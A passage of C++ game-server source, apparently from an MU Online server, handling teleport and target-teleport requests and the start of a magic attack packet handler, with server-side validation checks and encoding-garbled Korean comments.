	if( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_STUN ) == true )
#endif
#else
	if( gObj[aIndex].m_iSkillStunTime > 0 )
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013
	{
		// ���� ������.. ���� �޽��� ����
		PMSG_TELEPORT_RESULT		pTeleportResult;
		pTeleportResult.h.c			= PMHCE_BYTE;
		pTeleportResult.h.size		= sizeof( pTeleportResult );
		pTeleportResult.h.headcode	= 0x1C;
		pTeleportResult.MoveNumber	= 0;
		pTeleportResult.MapNumber	= gObj[aIndex].MapNumber;
		pTeleportResult.MapX		= gObj[aIndex].X;
		pTeleportResult.MapY		= gObj[aIndex].Y;
		pTeleportResult.Dir			= gObj[aIndex].Dir;			
		
		DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
		return;
	}
#else
		return;
#endif	// MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013

#endif

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ȯ�� ������� ������ ������ ��Ż, �ڷ���Ʈ ������
	if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber) 
		&& g_IllusionTempleEvent.GetIllusionTempleState(gObj[aIndex].MapNumber) == ILLUSION_TEMPLE_STATE_PLAYING)
	{
		if(g_IllusionTempleEvent.CheckRelics(aIndex))
		{
			// ���� ������.. ���� �޽��� ����
			PMSG_TELEPORT_RESULT		pTeleportResult;
			pTeleportResult.h.c			= PMHCE_BYTE;
			pTeleportResult.h.size		= sizeof( pTeleportResult );
			pTeleportResult.h.headcode	= 0x1C;
			pTeleportResult.MoveNumber	= 0;
			pTeleportResult.MapNumber	= gObj[aIndex].MapNumber;
			pTeleportResult.MapX		= gObj[aIndex].X;
			pTeleportResult.MapY		= gObj[aIndex].Y;
			pTeleportResult.Dir			= gObj[aIndex].Dir;			

			DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
			
			return;
		}

		// �ӹ��� �ɸ����¿����� ���� �̵� ����
#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_4_20070802
		if(g_IllusionTempleEvent.CheckSkillRestraint(gObj[aIndex].m_iIllusionTempleIndex, gObj[aIndex].MapNumber))
#else
		if((gObj[aIndex].m_ViewSkillState & STATE_ILLUSION_TEMPLE_RESTRAINT) == STATE_ILLUSION_TEMPLE_RESTRAINT)
#endif
		{
			// ���� ������.. ���� �޽��� ����
			PMSG_TELEPORT_RESULT		pTeleportResult;
			pTeleportResult.h.c			= PMHCE_BYTE;
			pTeleportResult.h.size		= sizeof( pTeleportResult );
			pTeleportResult.h.headcode	= 0x1C;
			pTeleportResult.MoveNumber	= 0;
			pTeleportResult.MapNumber	= gObj[aIndex].MapNumber;
			pTeleportResult.MapX		= gObj[aIndex].X;
			pTeleportResult.MapY		= gObj[aIndex].Y;
			pTeleportResult.Dir			= gObj[aIndex].Dir;			

			DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
			
			return;
		}
	}
#endif

#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_3_20070731	// ����� ��������� ��� �׷���Ʈ ������
	if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber) 
		&& g_IllusionTempleEvent.GetIllusionTempleState(gObj[aIndex].MapNumber) == ILLUSION_TEMPLE_STATE_READY)
	{
		// ���� ������.. ���� �޽��� ����
		PMSG_TELEPORT_RESULT		pTeleportResult;
		pTeleportResult.h.c			= PMHCE_BYTE;
		pTeleportResult.h.size		= sizeof( pTeleportResult );
		pTeleportResult.h.headcode	= 0x1C;
		pTeleportResult.MoveNumber	= 0;
		pTeleportResult.MapNumber	= gObj[aIndex].MapNumber;
		pTeleportResult.MapX		= gObj[aIndex].X;
		pTeleportResult.MapY		= gObj[aIndex].Y;
		pTeleportResult.Dir			= gObj[aIndex].Dir;			
		
		DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
		
		return;
	}
#endif
	
#ifdef MODIFY_DONT_TELEPORT_EVNET_ENDING_IN_EVENTMAP_20081118
	// �̺�Ʈ�ʿ��� �̺�Ʈ�� ������ ������̹Ƿ� �ڷ���Ʈ ����
	if( CHECK_CHAOSCASTLE( gObj[aIndex].MapNumber )
		&& g_ChaosCastle.GetCurrentState(gObj[aIndex].m_cChaosCastleIndex) == CHAOSCASTLE_STATE_PLAYEND
		)
	{
		// ���� ������.. ���� �޽��� ����
		PMSG_TELEPORT_RESULT		pTeleportResult;
		pTeleportResult.h.c			= PMHCE_BYTE;
		pTeleportResult.h.size		= sizeof( pTeleportResult );
		pTeleportResult.h.headcode	= 0x1C;
		pTeleportResult.MoveNumber	= 0;
		pTeleportResult.MapNumber	= gObj[aIndex].MapNumber;
		pTeleportResult.MapX		= gObj[aIndex].X;
		pTeleportResult.MapY		= gObj[aIndex].Y;
		pTeleportResult.Dir			= gObj[aIndex].Dir;			
		
		DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
		
		return;
	}
#endif // MODIFY_DONT_TELEPORT_EVNET_ENDING_IN_EVENTMAP_20081118

	//LogAdd("���� �̵� �������� Recv %s %d", gObj[aIndex].Name, lpMsg->MoveNumber);
	if( lpMsg->MoveNumber == 0 )	// �����̵� ���
	{
		CMagicInf *lpMagic;
		BYTE x, y;
		
		PMSG_MAGICATTACK_RESULT	pAttack;
		
		PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof( pAttack));
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD 
		pAttack.MagicNumberH   = HIBYTE( AT_SKILL_TELEPORT );
		pAttack.MagicNumberL   = LOBYTE( AT_SKILL_TELEPORT );
#else
		pAttack.MagicNumber   = AT_SKILL_TELEPORT;
#endif
		pAttack.SourceNumberH = HIBYTE(aIndex);
		pAttack.SourceNumberL = LOBYTE(aIndex);	
		pAttack.TargetNumberH = HIBYTE(aIndex);
		pAttack.TargetNumberL = LOBYTE(aIndex);	

		lpMagic  = gObjGetMagicSearch(&gObj[aIndex], AT_SKILL_TELEPORT);

		x = lpMsg->MapX;
		y = lpMsg->MapY;

#ifndef WORLD_TOURNAMENT_EVENT_SETTING
		if( !gObjCheckTeleportArea(aIndex, x, y) )
		{
			LogAddC(LOGC_RED, "[%s][%s] Try Teleport Not Move Area [%d,%d]", 
				   gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

#ifdef AUTH_GAMESERVER_CHECKKEY
			if( szAuthKey[5] != AUTH_CHECK_05 )
				DestroyGIocp();
#endif
			// ���� ������.. ���� �޽��� ����
			PMSG_TELEPORT_RESULT		pTeleportResult;
			pTeleportResult.h.c			= PMHCE_BYTE;
			pTeleportResult.h.size		= sizeof( pTeleportResult );
			pTeleportResult.h.headcode	= 0x1C;
			pTeleportResult.MoveNumber	= 0;
			pTeleportResult.MapNumber	= gObj[aIndex].MapNumber;
			pTeleportResult.MapX		= gObj[aIndex].X;
			pTeleportResult.MapY		= gObj[aIndex].Y;
			pTeleportResult.Dir			= gObj[aIndex].Dir;			

			DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
			return;
		}
#endif

#ifdef CASTLE_MAIN_SCHEDULER_20041111		// �����ʿ����� ������ �� �������� �ڷ���Ʈ ���� ���Ѵ�.
		if (gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE) {
			if (g_CastleSiege.CheckTeleportMagicAxisY(gObj[aIndex].Y, x, y) == FALSE) {
				y						= gObj[aIndex].Y;
			}
		}
#endif

		if( lpMagic != NULL )
		{
			// ������ ����Ѵ�. (���� ������ ���ٸ�... ����)
			int usemana;
			usemana = gObjMagicManaUse(&gObj[aIndex], lpMagic);
			if( usemana >= 0 )
			{
#ifdef NEW_FORSKYLAND2
				int usebp = gObjMagicBPUse(&gObj[aIndex], lpMagic);
				if( usebp >= 0 )
				{		
#endif
					if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
						DataSend(aIndex, (LPBYTE)&pAttack, pAttack.h.size);

					MsgSendV2(&gObj[aIndex], (LPBYTE)&pAttack, pAttack.h.size);
					gObjTeleportMagicUse(aIndex, x, y);
					gObj[aIndex].Mana = (float)usemana;
#ifdef NEW_FORSKYLAND2
					gObj[aIndex].BP = usebp;
					GCManaSend(gObj[aIndex].m_Index, (short)gObj[aIndex].Mana, 0xFF, 0, gObj[aIndex].BP);
				}
#else
					GCManaSend(gObj[aIndex].m_Index, (short)gObj[aIndex].Mana, 0xFF, 0, 0);
#endif
			}
		}
	}
	else 
	{
		if( gGateC.IsInGate(aIndex, lpMsg->MoveNumber) ) 
			gObjMoveGate(aIndex, lpMsg->MoveNumber);
		else
		{
			gObjClearViewport(&gObj[aIndex]);
			GCTeleportSend(&gObj[aIndex], lpMsg->MoveNumber, gObj[aIndex].MapNumber, (BYTE)gObj[aIndex].X, (BYTE)gObj[aIndex].Y, gObj[aIndex].Dir);

#ifdef CASTLE_MAIN_SCHEDULER_20041111		// �����ʿ����� �ڷ���Ʈ ���Ŀ� �ڽ��� �������� ���¸� �ٽ� ������
			if (gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE &&
				g_CastleSiege.GetCastleState() == CASTLESIEGE_STATE_STARTSIEGE
				)
			{
				g_CastleSiege.NotifySelfCsJoinSide (aIndex);
				g_CastleSiege.NotifyCsSelfLeftTime (aIndex);
			}
#endif
		}
	}
}


//////////////////////////////////////////////////////////////////////////////
// [0xB0] ����� �����̵� ��ĭ��
void CGTargetTeleportRecv(LPPMSG_TARGET_TELEPORT lpMsg, int aIndex)
{

#ifdef ADD_NEW_SKILL_FOR_CASTLE_02_20050531
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
		return;

	// ������ �ɷ� ������ �����̵� �� �� ����.
	#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
	if( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_STUN ) == true )
	#else
	if( gObj[aIndex].m_iSkillStunTime > 0 )
	#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
		return;
#endif

#ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// �������¿����� �����̵��� �Ҽ� ����.
	if( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_SLEEP ) == true )
		return;
#endif

	//LogAdd("���� �̵� �������� Recv %s %d", gObj[aIndex].Name, lpMsg->MoveNumber);	
	CMagicInf *lpMagic;
	BYTE x, y;
	
	PMSG_MAGICATTACK_RESULT	pAttack;
	
	PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof( pAttack));
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD 
	pAttack.MagicNumberH   = HIBYTE( AT_SKILL_TARGET_TELEPORT );
	pAttack.MagicNumberL   = LOBYTE( AT_SKILL_TARGET_TELEPORT );
#else
	pAttack.MagicNumber   = AT_SKILL_TARGET_TELEPORT;
#endif
	pAttack.SourceNumberH = HIBYTE(aIndex);
	pAttack.SourceNumberL = LOBYTE(aIndex);	

	int iTargetIndex = MAKEWORD(lpMsg->NumberH,lpMsg->NumberL);

	pAttack.TargetNumberH = HIBYTE(iTargetIndex);
	pAttack.TargetNumberL = LOBYTE(iTargetIndex);
	

	lpMagic  = gObjGetMagicSearch(&gObj[aIndex], AT_SKILL_TARGET_TELEPORT);

	x = lpMsg->MapX;
	y = lpMsg->MapY;

	if( gObjIsConnectedGP(iTargetIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "[%s][%s] Try Target Teleport Not Move Area [%d,%d]", 
			   gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

		return;
	}

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ȯ�� ������� ������ ��� �ִ� ĳ�� �����̵� ����
	if(CHECK_ILLUSION_TEMPLE(gObj[iTargetIndex].MapNumber))
	{
		if(g_IllusionTempleEvent.CheckRelics(gObj[iTargetIndex].m_Index))
		{
			return;
		}
	}
#endif

	if( gObj[aIndex].PartyNumber != gObj[iTargetIndex].PartyNumber
#ifdef MODIFY_TELEPORT_SKILL_USING_PARTY_MEMBER_20060504
		|| gObj[aIndex].PartyNumber == -1
		|| gObj[iTargetIndex].PartyNumber == -1
#endif
		)
	{
#ifndef MODIFY_TELEPORT_SKILL_USING_PARTY_MEMBER_20060504
		// ���� ������.. ���� �޽��� ����
		PMSG_TELEPORT_RESULT	pTeleportResult;
		pTeleportResult.h.c		= PMHCE_BYTE;
		pTeleportResult.h.size		= sizeof( pTeleportResult );
		pTeleportResult.h.headcode = 0x1C;
		pTeleportResult.MoveNumber = 0;
		pTeleportResult.MapNumber  = gObj[iTargetIndex].MapNumber;
		pTeleportResult.MapX		= gObj[iTargetIndex].X;
		pTeleportResult.MapY		= gObj[iTargetIndex].Y;
		pTeleportResult.Dir		= gObj[iTargetIndex].Dir;			

		DataSend(iTargetIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
#endif
		return;
	}

	if( !gObjCheckTeleportArea(iTargetIndex, x, y) )
	{
		LogAddC(LOGC_RED, "[%s][%s] Try Target Teleport Not Move Area [%d,%d]", 
			   gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

#ifndef MODIFY_TELEPORT_SKILL_USING_PARTY_MEMBER_20060504
		// ���� ������.. ���� �޽��� ����
		PMSG_TELEPORT_RESULT	pTeleportResult;
		pTeleportResult.h.c		= PMHCE_BYTE;
		pTeleportResult.h.size		= sizeof( pTeleportResult );
		pTeleportResult.h.headcode = 0x1C;
		pTeleportResult.MoveNumber = 0;
		pTeleportResult.MapNumber  = gObj[iTargetIndex].MapNumber;
		pTeleportResult.MapX		= gObj[iTargetIndex].X;
		pTeleportResult.MapY		= gObj[iTargetIndex].Y;
		pTeleportResult.Dir		= gObj[iTargetIndex].Dir;			

		DataSend(iTargetIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);	
#endif
		return;
	}


	if( lpMagic != NULL )
	{
		// ������ ����Ѵ�. (���� ������ ���ٸ�... ����)
		int usemana;
		usemana = gObjMagicManaUse(&gObj[aIndex], lpMagic);
		if( usemana >= 0 )
		{
#ifdef NEW_FORSKYLAND2
			int usebp = gObjMagicBPUse(&gObj[aIndex], lpMagic);
			if( usebp >= 0 )
#endif
			{				
				if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
					DataSend(aIndex, (LPBYTE)&pAttack, pAttack.h.size);

				MsgSendV2(&gObj[aIndex], (LPBYTE)&pAttack, pAttack.h.size);
				gObjTeleportMagicUse(iTargetIndex, x, y);
				gObj[aIndex].Mana = (float)usemana;

#ifdef NEW_FORSKYLAND2
				gObj[aIndex].BP = usebp;
				GCManaSend(gObj[aIndex].m_Index, (short)gObj[aIndex].Mana, 0xFF, 0, gObj[aIndex].BP);
#else
				GCManaSend(gObj[aIndex].m_Index, (short)gObj[aIndex].Mana, 0xFF, 0, 0);
#endif
			}

		}
	}	
}

//////////////////////////////////////////////////////////////////////////////
// [0x1C] ���� �̵��� ����� ���
#ifdef THIRD_CHANGEUP_SYSTEM_20070507	// BYTE MoveNumber -> int MoveNumber
void GCTeleportSend(LPOBJECTSTRUCT lpObj, int MoveNumber, BYTE MapNumber,BYTE MapX, BYTE MapY, BYTE Dir)
#else
void GCTeleportSend(LPOBJECTSTRUCT lpObj, BYTE MoveNumber, BYTE MapNumber,BYTE MapX, BYTE MapY, BYTE Dir)
#endif
{
	if( lpObj->Type != OBJTYPE_CHARACTER ) return;

	PMSG_TELEPORT_RESULT	pMsg;
	//BYTE sendbuf[256];

#ifdef THIRD_CHANGEUP_SYSTEM_20070507	// MoveNumber�� 0 / 1�� ����Ѵ�.(Gate �ε��� ��ȣ�� BYTE�� �Ѿ)
	if( MoveNumber > 0 )
		MoveNumber = 1;
#endif

	pMsg.h.c		= PMHCE_BYTE;
	pMsg.h.size		= sizeof( pMsg );
	pMsg.h.headcode = 0x1C;
	pMsg.MoveNumber = MoveNumber;
	pMsg.MapNumber  = MapNumber;
	pMsg.MapX		= MapX;
	pMsg.MapY		= MapY;
	pMsg.Dir		= Dir;

	if( MoveNumber == 0 )
	{
		DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);
	}
	else
	{
		DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);
	}
}

// [PACKET_MAGIC_ATTACK] Ŭ���̾�Ʈ�� �������� ���ݴ��ߴٰ� �˸���.
void CGBeattackRecv(LPBYTE lpRecv, int aIndex, int magic_send)
{
	LPPMSG_BEATTACK_COUNT	lpCount = (LPPMSG_BEATTACK_COUNT)lpRecv;
	int	lOfs;
	CMagicInf *lpMagic;

#ifdef PACKET_CHANGE	
	if( lpCount->h.headcode != PACKET_MAGIC_ATTACK ) 
#else
	if( lpCount->h.headcode != 0x1D ) 
#endif
	{
		LogAdd("error-L3 %s %d", __FILE__, __LINE__);
		return;
	}
	if( lpCount->Count < 1 ) {
		LogAdd("error-L3 %s %d", __FILE__, __LINE__);
		return;
	}
	if( lpCount->Count > 5 ) lpCount->Count = 5;	// �ִ� 5���� ���� ���ϰ� �Ѵ�.

	int tNumber;

	lOfs = sizeof(PMSG_BEATTACK_COUNT);
	LPPMSG_BEATTACK	lpMsg;

//	lpMagic = gObjGetMagic(&gObj[aIndex], lpCount->MagicNumber);
	// ����� ���� ��ġ�� üũ�ϰ� ������ ���Ŀ� ���� ���� ���� ��ȣ�� üũ�Ѵ�.

	if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
	{
#ifdef MODIFY_SAFEZONE_CHECK_ATTACK_20080903
		BYTE attr = MapC[gObj[aIndex].MapNumber].GetAttr(gObj[aIndex].X, gObj[aIndex].Y);
		
		if( ((attr&MAP_ATTR_SAFTYZONE) == MAP_ATTR_SAFTYZONE) )		// ���������� ��ų �ߵ� ���Ѵ�.
		{
			gObjSetPosition( aIndex, gObj[aIndex].X, gObj[aIndex].Y );
			
			return;
		}
#endif // MODIFY_SAFEZONE_CHECK_ATTACK_20080903

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
		WORD wMagicNumber = MAKEWORD( lpCount->MagicNumberL, lpCount->MagicNumberH );
		lpMagic = gObjGetMagicSearch( &gObj[aIndex], wMagicNumber );	
#else
#ifdef CHANGE_MAGICATTACKPACKET	// ���� ������ȣ ��ſ� ��ų ��ȣ�� ����
		lpMagic = gObjGetMagicSearch(&gObj[aIndex], lpCount->MagicNumber);
#else
		lpMagic = gObjGetMagic(&gObj[aIndex], lpCount->MagicNumber);
#endif
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107
	}
	else
	{
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
		WORD wMagicNumber = MAKEWORD( lpCount->MagicNumberL, lpCount->MagicNumberH );
		lpMagic = gObjGetMagic( &gObj[aIndex], wMagicNumber );	
#else
		lpMagic = gObjGetMagic(&gObj[aIndex], lpCount->MagicNumber);
#endif
	}
	
	if( lpMagic == NULL )
	{
		LogAdd("error-L3 %s %d", __FILE__, __LINE__);
		return;
	}

#ifdef ADD_SKILL_WITH_COMBO
#ifdef UPDATE_MASTER_LEVEL_4RANK_20080428	// ��ο� ��ȭ, �г��� �ϰ� ��ȭ �޺�ó�� �߰�
	if( lpMagic->m_Skill == AT_SKILL_BLOWOFFURY ||	// �г��� �ϰ�
		lpMagic->m_Skill == AT_SKILL_STRIKE		||	// ��ο�
		g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_STRIKE	||	// ��ο� ��ȭ(���)
		g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_BLOWOFFURY ||	// �г��� �ϰ� ��ȭ(���)
#else	// UPDATE_MASTER_LEVEL_4RANK_20080428
	if( lpMagic->m_Skill == AT_SKILL_BLOWOFFURY ||	// �г��� �ϰ�
		lpMagic->m_Skill == AT_SKILL_STRIKE		||	// ��ο�
#endif	// UPDATE_MASTER_LEVEL_4RANK_20080428
		
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ȸ�������Ⱝȭ(���) �޺� ó��
		lpMagic->m_Skill == AT_SKILL_WHEEL		|| 						// ȸ��������
		lpMagic->m_Skill == AT_SKILL_ML_STRENGTHEN_WHEEL_KNIGHT			// ȸ�������� ��ȭ(���)
		)	
#else
		lpMagic->m_Skill == AT_SKILL_WHEEL		)	// ȸ��������
#endif
	{
		return;
	}
#endif

#ifdef NEW_ATTACK_PROC	// ���ο� ����ó�������� ������ �����ϹǷ� ���Ͻ�Ų��
	if( lpMagic->m_Skill == AT_SKILL_BLOWOFFURY ||	// �г��� �ϰ�
		//lpMagic->m_Skill == AT_SKILL_EVIL		||	// �Ƿ�
		lpMagic->m_Skill == AT_SKILL_HELL		||	// �����̾�
		lpMagic->m_Skill == AT_SKILL_INFERNO	||	// ���丣��
		lpMagic->m_Skill == AT_SKILL_WHEEL		)	// ȸ��������
	{
		return;
	}
#endif

#ifdef MODIFY_SKILL_EVEIL_AT_SERVER_20070117	// �Ƿ� ���� �Ǵ�.
	if( lpMagic->m_Skill == AT_SKILL_EVIL )
	{
		return;
	}
#endif


	if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
	{	
		/*if( gObj[aIndex].UseMagicNumber != lpMagic->m_Skill)
		{			
			LogAdd("error-L3 %s %d %d %d", __FILE__, __LINE__, gObj[aIndex].UseMagicNumber, lpMagic->m_Skill);
			return;
		}
		*/
#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122	// SkillGetRequireClass(...) 3������ �߰�
		if( MagicDamageC.SkillGetRequireClass(gObj[aIndex].Class, gObj[aIndex].ChangeUP, gObj[aIndex].ThirdChangeUp, lpMagic->m_Skill) < 1 )
#else
#ifdef NEW_SKILL_FORSKYLAND
		if( MagicDamageC.SkillGetRequireClass(gObj[aIndex].Class, gObj[aIndex].ChangeUP, lpMagic->m_Skill) < 1 )
#else
		if( MagicDamageC.SkillGetRequireClass(gObj[aIndex].Class, lpMagic->m_Skill) == 0 )
#endif
#endif	// MASTER_LEVEL_SKILL_SYSTEM_20071122
		{
			LogAddC(LOGC_RED, lMsg.Get(495), gObj[aIndex].AccountID, gObj[aIndex].Name, lpMagic->m_Skill);
			gObjUserKill(aIndex);
			return;
		}

		// ������ ������� 3�ʰ� �����ٸ�.. �������Ѵ�.
		//if( (GetTickCount()-gObj[aIndex].UseMagicTime) > (1000*4) )
		if( (GetTickCount()-gObj[aIndex].UseMagicTime) > (1000*8) )
		{
			/*
#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
			if( CHECK_DEVILSQUARE(gObj[aIndex].MapNumber) )
#else
			if( gObj[aIndex].MapNumber != 9 )
#endif
			{	// �Ǹ��� ���忡����  ���� ���븸 �ȵǰ� �Ѵ�
				gObjUserKill(aIndex);
			}
			*/
			LogAddC(LOGC_RED, "Too long time passed after casting magic. [%s][%s] (%d)(%d)", 
					gObj[aIndex].AccountID, gObj[aIndex].Name, lpMagic->m_Skill, GetTickCount()-gObj[aIndex].UseMagicTime);
			//LogAddC(LOGC_RED, lMsg.Get(496), gObj[aIndex].AccountID, gObj[aIndex].Name, lpMagic->m_Skill);
			return;
		}
		if( gObj[aIndex].UseMagicCount > 4 )
		{
			//LogAdd("error-L3 %s %d", __FILE__, __LINE__);
			return;
		}
		gObj[aIndex].UseMagicCount++;
	}

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��Ƽ�꽺ų ��� ���
	if( g_MasterSkillSystem.CheckMasterLevelSkill( lpMagic->m_Skill ) )
	{
		INT iBaseMLS = g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill );
		if( iBaseMLS != AT_SKILL_ML_STRENGTHEN_MAGICDEFENSE			&&	// �ҿ�ٸ��� ��ȭ
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_HELL					&&	// �����̾� ��ȭ
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_WHEEL_KNIGHT			&&	// ȸ�������� ��ȭ1 (���)
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_HEALING				&&	// ġ�� ��ȭ
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_CROSSBOW				&&	// �ٹ� ��ȭ
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_WHEEL_MAGUMSA		&&	// ȸ�������� ��ȭ2 (���˻�)
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_KNIGHTADDLIFE		&&	// ���������� ��ȭ	
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_BLAST				&&	// ����Ʈ ��ȭ
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_DARKHORSE_ATTACK		&&	// �����ũ ��ȭ
			iBaseMLS != AT_SKILL_ML_STRENGTHEN_FIREBURST				// ���̾����Ʈ ��ȭ

#ifdef UPDATE_MASTER_LEVEL_4RANK_20080428	// �����ͷ��� 4��ũ
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_EVIL					// �Ƿ� ��ȭ
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_EXPICE				// ���� ���̽� ��ȭ
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_STRIKE				// ��ο� ��ȭ(���)
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_BLOWOFFURY			// �г��� �ϰ� ��ȭ(���)
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_DEFENSE				// ���� ���
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_ATTACK				// ���ݷ� ���	
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_DEFENSEDOWN			// ���� ���� ��ȭ
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_SWORD6				// �Ŀ� ������ ��ȭ
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_FIRESCREAM			// ���̾� ��ũ�� ��ȭ
#endif	// UPDATE_MASTER_LEVEL_4RANK_20080428
			
#ifdef UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
			&& iBaseMLS !=	AT_SKILL_ML_STRENGTHEN_MAGUMSA_EVIL			// �Ƿ� ��ȭ(���˻�)
#endif	// UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
			)
		{
			LogAdd("error-L3 %s %d", __FILE__, __LINE__);
			return;
		}			
	}
	else
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107
	if( lpMagic->m_Skill != AT_SKILL_STORM &&
		lpMagic->m_Skill != AT_SKILL_EVIL &&
		lpMagic->m_Skill != AT_SKILL_HELL &&
		lpMagic->m_Skill != AT_SKILL_BLAST &&
		lpMagic->m_Skill != AT_SKILL_INFERNO && 
		lpMagic->m_Skill != AT_SKILL_FLAME &&
		lpMagic->m_Skill != AT_SKILL_CROSSBOW &&
		lpMagic->m_Skill != AT_SKILL_DEVILFIRE &&
		lpMagic->m_Skill != AT_SKILL_FLASH &&
		lpMagic->m_Skill != AT_SKILL_WHEEL && 		
		lpMagic->m_Skill != AT_SKILL_KNIGHTSPEAR	&& // ���â
		lpMagic->m_Skill != AT_SKILL_STRIKE	// ���â

//#ifndef NEW_ATTACK_PROC	// ���ο� ����ó�������� ������ �����ϹǷ� ����� ���� �ȵȴ�
		&& 
		lpMagic->m_Skill != AT_SKILL_BLOWOFFURY &&	
		lpMagic->m_Skill != AT_SKILL_PENETRATION &&		
		lpMagic->m_Skill != AT_SKILL_DEFENSEDOWN 
//#endif			

#ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
		&& lpMagic->m_Skill != AT_SKILL_FIRESCREAM		// ���̾� ��ũ��		
#endif
		)
	{
		LogAdd("error-L3 %s %d", __FILE__, __LINE__);
		return;
	}	
	
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// �ٹ� ��ȭ ���� ó��
	if( lpMagic->m_Skill == AT_SKILL_CROSSBOW 
		|| lpMagic->m_Skill == AT_SKILL_FIRESCREAM 
		|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_CROSSBOW 
		|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_FIRESCREAM
		)
#else
#ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
	if( lpMagic->m_Skill == AT_SKILL_CROSSBOW || lpMagic->m_Skill == AT_SKILL_FIRESCREAM )
#else
	if( lpMagic->m_Skill == AT_SKILL_CROSSBOW )
#endif
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107
	{	// ���� �ٹ��� �Ϲ� ���ݰ� ����ó��
		int NSAttackSerial = lpCount->Serial;
		
		if( gObj[aIndex].OSAttackSerial >= 255 && ((gObj[aIndex].OSAttackSerial-lpCount->Serial)>50))
		{
			gObj[aIndex].OSAttackSerial = -1;
		}

		if(NSAttackSerial > gObj[aIndex].OSAttackSerial )
		{
			gObj[aIndex].OSAttackSerial = NSAttackSerial;

			LPOBJECTSTRUCT lpObj= &gObj[aIndex];

			int iTimeCalc = GetTickCount()-lpObj->m_LastAttackTime;

#ifdef FOR_CHINA
